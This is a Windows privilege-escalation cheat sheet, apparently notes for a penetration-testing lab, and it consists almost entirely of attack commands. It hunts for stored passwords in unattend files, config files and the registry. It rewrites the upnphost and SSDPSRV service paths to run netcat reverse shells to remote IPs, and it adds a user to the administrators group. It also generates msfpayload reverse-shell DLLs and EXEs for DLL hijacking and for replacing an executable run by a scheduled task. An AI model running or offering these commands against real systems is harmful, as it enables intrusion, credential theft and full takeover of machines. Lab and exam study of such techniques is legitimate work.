# Windows Priv Notes

1- INFORMATION GATHERING:

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"Domain"

hostname
echo %username%

net users
net user bob

ipconfig /all
route print
arp -A

netstat -ano
netsh firewall show state
netsh firewall show config

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml


Services\Services.xml: Element-Specific Attributes
ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
Printers\Printers.xml: SharedPrinter Element
Drives\Drives.xml: Element-Specific Attributes
DataSources\DataSources.xml: Element-Specific Attributes


reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir abc.txt /s /p
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

sc qc Spooler
https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx
accesschk.exe -ucqv Spooler
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -ucqv SSDPSRV
accesschk.exe -ucqv upnphost

ONE:
sc qc upnphost
sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.62 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost

if fail:
        sc qc upnphost
    sc config SSDPSRV start= auto
    net start SSDPSRV

SECOND:
sc qc SSDPSRV
sc config SSDPSRV binpath= "c:\inetpub\nc.exe -nv 10.11.0.90 9090 -e cmd.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc config SSDPSRV start= "demand"
sc qc SSDPSRV
net start SSDPSRV

nc -lvvp 9090
net localgroup administrators
net localgroup administrators IWAM_BOB /add
cd c:\
dir /b /s proof.txt
type C:\"Documents and Settings"\Administrator\Desktop\proof.txt

DLL INJECTION:
echo %path%
cacls "C:\Python27"
CACLS c:\ /E /T /C /G "Authenticated Users":F
sc qc IKEEXT
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D > /root/Desktop/evil.dll
copy evil.dll C:\Python27\wlbsctrl.dll


TFTP & SCHEDULE TASK
accesschk.exe -dqv "E:\GrabLogs"
msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' R | msfencode -t exe > /root/Desktop/evil-tftp.exe
copy evil-tftp.exe E:\GrabLogs\tftp.exe






*** 

Example:

Victim machine low priv:
```
sc qc upnphost
sc config upnphost binpath= "C:\Inetpub\Scripts\nc.exe -nv 10.11.0.62 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost
sc qc SSDPSRV
```
